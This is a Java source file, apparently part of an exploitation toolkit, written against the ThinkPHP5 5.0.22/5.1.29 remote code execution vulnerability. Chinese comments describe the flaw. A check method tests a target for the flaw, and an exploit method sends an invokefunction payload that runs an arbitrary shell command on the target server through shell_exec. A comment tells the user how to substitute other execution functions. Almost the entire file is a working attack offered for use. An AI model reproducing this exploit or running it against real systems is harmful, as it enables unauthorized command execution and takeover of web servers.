package Module;

import Framework.HTTPinterface;

/**
 * ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
 *
 * ThinkPHP是一款运用极广的PHP开发框架。
 * 其版本5中，由于没有正确处理控制器名，
 * 导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，
 * 从而导致远程命令执行漏洞。
 */

public class TP5_invokefunction_RCE {
    public static Boolean check(String url){
        try {
            String result = HTTPinterface.GET(url +
                    "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=112233");
            if(result.contains("112233")){
                return true;
            }else{
                return false;
            }
        }catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url,String cmd){
        try{
            cmd=cmd.replace(" ","+");    //替换空格为加号，防止在拼接payload时出错
            String payload=url+
                    "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]="+cmd;
            //如需修改命令执行函数，改写上面这行的shell_exec为需要的函数即可（如system/exec/passthru等）
            String result=HTTPinterface.GET(payload);
            return result;
        }catch (Exception e){
            return "[-]访问出错";
        }
    }
}
